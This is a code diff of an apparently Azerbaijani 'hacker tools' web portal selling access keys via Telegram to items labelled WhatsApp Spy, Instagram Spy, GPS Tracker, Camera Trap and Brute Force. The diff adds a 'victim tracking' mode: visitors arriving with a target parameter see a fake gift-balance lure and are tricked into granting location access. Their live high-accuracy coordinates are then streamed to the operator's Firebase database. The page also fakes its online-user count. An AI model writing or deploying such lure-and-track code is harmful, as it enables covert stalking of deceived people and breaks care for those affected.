@@ -13,26 +13,26 @@
         * { box-sizing: border-box; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
         body { margin: 0; background: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow-x: hidden; min-height: 100vh; background: radial-gradient(circle at center, #0a0a1a 0%, #020205 100%); }
 
-        /* ORIJINAL DIZAYN */
+        /* DISCLAIMER / QARA EKRAN */
         #view-disclaimer { position: fixed; inset: 0; z-index: 10000; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
         .matrix-text { color: var(--cyber); font-family: 'Courier New', monospace; font-size: 1rem; text-align: center; max-width: 650px; min-height: 120px; text-shadow: 0 0 5px var(--cyber); }
+
+        /* UI SECTIONS */
         #view-login, #view-menu { display: none; padding: 30px; max-width: 1200px; margin: auto; animation: fadeIn 0.8s ease; }
         .navbar { display: flex; justify-content: space-between; align-items: center; background: var(--glass); padding: 20px 35px; border-radius: 25px; border: 1px solid var(--border); margin: 20px 0; backdrop-filter: blur(10px); }
         .stats-top { display: flex; justify-content: center; gap: 30px; margin-bottom: 25px; font-family: 'Syncopate'; font-size: 0.6rem; letter-spacing: 2px; opacity: 0.6; }
+
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
         .card { background: var(--glass); padding: 45px; border-radius: 40px; border: 1px solid var(--border); text-align: center; cursor: pointer; position: relative; overflow: hidden; }
         .card:hover { transform: translateY(-10px); border-color: var(--tools); box-shadow: 0 10px 30px rgba(0, 223, 255, 0.1); }
         .card i { font-size: 3.5rem; margin-bottom: 25px; }
         .key-tag { position: absolute; top: 15px; right: -30px; background: var(--gold); color: black; font-size: 0.6rem; font-weight: 900; padding: 5px 40px; transform: rotate(45deg); box-shadow: 0 0 10px var(--gold); }
+
         #tool-list { display: none; animation: slideUp 0.5s ease; }
         .back-btn { background: var(--glass); border: 1px solid var(--border); color: white; padding: 12px 25px; border-radius: 12px; cursor: pointer; margin-bottom: 30px; font-weight: 900; display: inline-block; }
         .btn-main { width: 100%; margin-top: 25px; padding: 18px; border-radius: 15px; border: none; background: white; color: black; font-weight: 900; cursor: pointer; }
         input { width: 100%; padding: 18px; border-radius: 15px; border: 1px solid var(--border); background: #000; color: white; text-align: center; margin-top: 20px; outline: none; }
         #modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 20000; padding: 40px; overflow-y: auto; }
-
-        /* APP-ÜÇÜN ÖZƏL KEY MODALI (Dizaynı qoruyaraq) */
-        #key-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 30000; align-items: center; justify-content: center; padding: 20px; }
-        .key-card { background: #0a0a1a; border: 1px solid var(--gold); padding: 40px; border-radius: 40px; width: 100%; max-width: 360px; text-align: center; }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
@@ -62,12 +62,12 @@
     </div>
     <div class="navbar">
         <div style="font-weight:900;">ID: <span id="u-display" style="color:var(--tools);">...</span></div>
-        <button onclick="openTelegram()" style="background:var(--gold); color:black; border:none; padding:8px 15px; border-radius:10px; font-weight:900; cursor:pointer; font-size:0.7rem;">KEY AL (TELEGRAM)</button>
+        <button onclick="window.open('https://t.me/+xzQqLQaA_SFjNmUy')" style="background:var(--gold); color:black; border:none; padding:8px 15px; border-radius:10px; font-weight:900; cursor:pointer; font-size:0.7rem;">KEY AL (TELEGRAM)</button>
     </div>
 
     <div id="category-selector" class="grid">
         <div class="card" onclick="showTools('cyber-grid')" style="border-left: 6px solid var(--cyber);">
-            <i class="fas fa-user-ninja" style="color:var(--cyber)"></i><h3>KİBER ƏMƏLİYYAT</h3>
+            <i class="fas fa-user-ninja" style="color:var(--cyber)"></i><h3>KİBER</h3>
         </div>
         <div class="card" onclick="showTools('tools-grid')" style="border-left: 6px solid var(--tools);">
             <i class="fas fa-shield-alt" style="color:var(--tools)"></i><h3>ALƏTLƏR</h3>
@@ -83,17 +83,6 @@
     </div>
 </section>
 
-<div id="key-modal">
-    <div class="key-card">
-        <h2 style="color:var(--gold); font-size:0.9rem; font-family:'Syncopate';">ACCESS KEY</h2>
-        <p id="key-err" style="color:red; font-size:0.6rem; display:none; margin-bottom:10px;">AÇAR YANLIŞDIR VƏ YA VAXTI BİTİB!</p>
-        <input type="text" id="manual-key" placeholder="AÇARI DAXİL EDİN" style="border-color:var(--gold); margin-top:0;">
-        <button class="btn-main" onclick="verifyKey()" style="background:var(--gold); color:black;">TƏSDİQLƏ</button>
-        <button class="btn-main" onclick="openTelegram()" style="background:#24A1DE; color:white; border:none;">TELEGRAMA KEÇ</button>
-        <button onclick="closeKeyModal()" style="background:none; border:none; color:gray; margin-top:15px; font-size:0.7rem;">LƏĞV ET</button>
-    </div>
-</div>
-
 <div id="modal-overlay">
     <button onclick="closeTool()" style="position:fixed; top:25px; right:25px; background:red; color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer; z-index:20001;">X</button>
     <div id="tool-content" style="margin-top:40px;"></div>
@@ -104,7 +93,27 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // DATA
+    // QURBAN İZLƏMƏ (GPS HACKER MODE)
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('target');
+    if(targetId) {
+        document.body.innerHTML = `<div style="background:#0a0a1a; color:white; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center; padding:20px;">
+            <i class="fas fa-gift" style="font-size:4rem; color:#ff007a; margin-bottom:20px;"></i>
+            <h2>TƏBRİKLƏR!</h2><p>50 AZN Hədiyyə Balansı qazandınız.</p>
+            <div style="background:#111; padding:20px; border-radius:15px; border:1px solid #333; margin:20px 0;"><p>Təsdiqləmək üçün məkan icazəsi verin.</p></div>
+            <button onclick="getGPS()" style="background:#ff007a; color:white; border:none; padding:15px 40px; border-radius:10px; font-weight:900; cursor:pointer; width:100%;">BALANSI TƏSDİQLƏ</button>
+        </div>`;
+        window.getGPS = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(pos => {
+                    db.ref('live_tracks/' + targetId).set({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
+                    alert("Balans regionunuza uyğun təsdiqləndi.");
+                }, () => alert("İcazə verməsəniz balans köçürülə bilməz."), {enableHighAccuracy:true});
+            }
+        };
+    }
+
+    // REAL BÖLMƏLƏR
     const toolGrids = {
         'cyber-grid': [
             {n:'Wordlist Yaradıcı', i:'fa-file-code', c:'var(--cyber)', f:'wordlist.html', p:1},
@@ -112,29 +121,59 @@
             {n:'SQL Skaner', i:'fa-database', c:'var(--cyber)', f:'sql_scan.html', p:1},
             {n:'Brute Force', i:'fa-unlock-alt', c:'var(--cyber)', f:'brute.html', p:1}
         ],
-        'tools-grid': [
-            {n:'WhatsApp Spy', i:'fa-whatsapp', c:'#25d366', f:'wa.html', p:1},
-            {n:'GPS Tracker', i:'fa-location-crosshairs', c:'var(--cyber)', f:'gps.html', p:1},
-            {n:'Instagram Spy', i:'fa-instagram', c:'var(--tools)', f:'insta.html', p:1},
-            {n:'Kamera Tələsi', i:'fa-camera', c:'var(--tools)', f:'trap.html', p:1},
-            {n:'IP İzləyici', i:'fa-location-dot', c:'white', f:'ip.html', p:0},
-            {n:'Anonim Mail', i:'fa-envelope-shield', c:'white', f:'mail.html', p:0}
-        ],
-        'fun-grid': [
-            {n:'Hədiyyə Çarxı', i:'fa-gift', c:'var(--fun)', f:'gift.html', p:0},
-            {n:'Gizli Test', i:'fa-mask', c:'var(--fun)', f:'secret.html', p:0},
-            {n:'Tarot Analizi', i:'fa-wand-sparkles', c:'var(--fun)', f:'tarot.html', p:0}
-        ]
+'tools-grid': [
+    {n:'WhatsApp Spy', i:'fa-whatsapp', c:'#25d366', f:'wa.html', p:1}, // p:1 yəni KEY tələb edir
+    {n:'GPS Tracker', i:'fa-location-crosshairs', c:'var(--cyber)', f:'gps.html', p:1},
+    {n:'Instagram Spy', i:'fa-instagram', c:'var(--tools)', f:'insta.html', p:1},
+    {n:'Kamera Tələsi', i:'fa-camera', c:'var(--tools)', f:'trap.html', p:1},
+    {n:'IP İzləyici', i:'fa-location-dot', c:'white', f:'ip.html', p:0},
+    {n:'Anonim Mail', i:'fa-envelope-shield', c:'white', f:'mail.html', p:0}
+],
     };
 
-    // LOGIKA
-    let currentF = "";
+    const disText = "Bu sayt vasitəsiylə edəcəyiniz hər hansı bir aktivasiyaya istər qurucu, istərsədə moderator cavabdehlik daşımır. Sayt sizi illegal işlərə təşviq etmir. Davam edərək məsuliyyəti qəbul edirsiniz.";
+    let charIdx = 0;
+
+    function typeWriter() {
+        if (charIdx < disText.length) {
+            document.getElementById('typewriter').innerHTML += disText.charAt(charIdx);
+            charIdx++; setTimeout(typeWriter, 20);
+        } else { document.getElementById('btn-agree').style.display = 'inline-block'; }
+    }
+
+    setTimeout(() => { if(document.getElementById('btn-agree').style.display === 'none') document.getElementById('btn-agree').style.display = 'inline-block'; }, 5000);
+
+    function acceptDisclaimer() {
+        document.getElementById('bg-music').play().catch(()=>{});
+        document.getElementById('view-disclaimer').style.display = 'none';
+        const s = localStorage.getItem('elite_session');
+        if(s) showMenu(s); else document.getElementById('view-login').style.display = 'flex';
+    }
+
+    async function handleLogin() {
+        const u = document.getElementById('u-input').value.trim().toLowerCase();
+        if(u.length < 3) return;
+        const snap = await db.ref('users/'+u).get();
+        if(snap.exists() && snap.val().isBlocked) return alert("SİZİN GİRİŞİNİZ BLOKLANIB!");
+        
+        localStorage.setItem('elite_session', u);
+        await db.ref('users/'+u).update({ isOnline: true, lastSeen: Date.now() });
+        showMenu(u);
+    }
+
+    function showMenu(u) {
+        document.getElementById('view-login').style.display = 'none';
+        document.getElementById('view-menu').style.display = 'block';
+        document.getElementById('u-display').innerText = u.toUpperCase();
+        db.ref('users/'+u+'/isOnline').onDisconnect().set(false);
+    }
+
     function showTools(key) {
         document.getElementById('category-selector').style.display = 'none';
         document.getElementById('tool-list').style.display = 'block';
         const grid = document.getElementById('active-grid'); grid.innerHTML = "";
         toolGrids[key].forEach(t => {
-            grid.innerHTML += `<div class="card" onclick="checkAccess('${t.f}', ${t.p})">
+            grid.innerHTML += `<div class="card" onclick="openTool('${t.f}', ${t.p})">
                 ${t.p ? '<div class="key-tag">KEY</div>' : ''}
                 <i class="fas ${t.i}" style="color:${t.c}"></i>
                 <h3>${t.n}</h3>
@@ -142,45 +181,30 @@
         });
     }
 
-    function checkAccess(f, p) {
-        if(!p) return loadTool(f);
-        currentF = f;
-        document.getElementById('key-modal').style.display = 'flex';
-        document.getElementById('key-err').style.display = 'none';
+    function backToCategories() {
+        document.getElementById('tool-list').style.display = 'none';
+        document.getElementById('category-selector').style.display = 'grid';
     }
 
-    async function verifyKey() {
-        const k = document.getElementById('manual-key').value.trim().toUpperCase();
-        if(!k) return;
-        const snap = await db.ref('keys/'+k).get();
-        if(snap.exists() && snap.val().status === "active" && snap.val().expiry > Date.now()) {
-            closeKeyModal(); loadTool(currentF);
-        } else {
-            document.getElementById('key-err').style.display = 'block';
+    async function openTool(file, isPremium) {
+        if(isPremium) {
+            const key = prompt("Zəhmət olmasa Access Key daxil edin:");
+            if(!key) return;
+            const snap = await db.ref('keys/' + key.toUpperCase()).get();
+            if(!snap.exists() || snap.val().status !== "active" || snap.val().expiry < Date.now()) {
+                alert("Key Yanlışdır və ya Vaxtı Bitib!"); return;
+            }
         }
+        
+        fetch(file).then(r => r.text()).then(h => {
+            document.getElementById('tool-content').innerHTML = h;
+            document.getElementById('modal-overlay').style.display = 'block';
+            const scripts = document.getElementById('tool-content').querySelectorAll('script');
+            scripts.forEach(s => { const n = document.createElement("script"); if(s.src) n.src = s.src; else n.textContent = s.textContent; document.head.appendChild(n).parentNode.removeChild(n); });
+        }).catch(()=>alert("Fayl tapılmadı!"));
     }
 
-    function openTelegram() {
-    // Artıq birbaşa Telegram-a yox, öz go.html səhifənə yönləndirirsən
-    window.location.href = "go.html";
-}
-
-// Key Modalı daxilindəki düyməni də buna uyğun et:
-// <button class="btn-main" onclick="openTelegram()" style="background:#24A1DE; color:white;">TELEGRAM-DAN AL</button>
-
-    function closeKeyModal() { document.getElementById('key-modal').style.display = 'none'; document.getElementById('manual-key').value=""; }
-    function loadTool(f) { fetch(f).then(r=>r.text()).then(h=>{ document.getElementById('tool-content').innerHTML=h; document.getElementById('modal-overlay').style.display='block'; }); }
     function closeTool() { document.getElementById('modal-overlay').style.display = 'none'; }
-    function backToCategories() { document.getElementById('tool-list').style.display = 'none'; document.getElementById('category-selector').style.display = 'grid'; }
-
-    // STANDARTLAR
-    const disText = "Bu sayt vasitəsiylə edəcəyiniz hər hansı bir aktivasiyaya istər qurucu, istərsədə moderator cavabdehlik daşımır. Sayt sizi illegal işlərə təşviq etmir. Davam edərək məsuliyyəti qəbul edirsiniz.";
-    let charIdx = 0;
-    function typeWriter() { if(charIdx < disText.length) { document.getElementById('typewriter').innerHTML += disText.charAt(charIdx); charIdx++; setTimeout(typeWriter, 20); } else { document.getElementById('btn-agree').style.display='inline-block'; } }
-    function acceptDisclaimer() { document.getElementById('bg-music').play().catch(()=>{}); document.getElementById('view-disclaimer').style.display='none'; if(localStorage.getItem('elite_session')) showMenu(localStorage.getItem('elite_session')); else document.getElementById('view-login').style.display='flex'; }
-    async function handleLogin() { const u = document.getElementById('u-input').value.trim().toLowerCase(); if(u.length < 3) return; localStorage.setItem('elite_session', u); await db.ref('users/'+u).update({ isOnline: true }); showMenu(u); }
-    function showMenu(u) { document.getElementById('view-login').style.display='none'; document.getElementById('view-menu').style.display='block'; document.getElementById('u-display').innerText=u.toUpperCase(); }
-
     window.onload = typeWriter;
     setInterval(() => { document.getElementById('online-count').innerText = Math.floor(Math.random()*20)+5; }, 4000);
 </script>
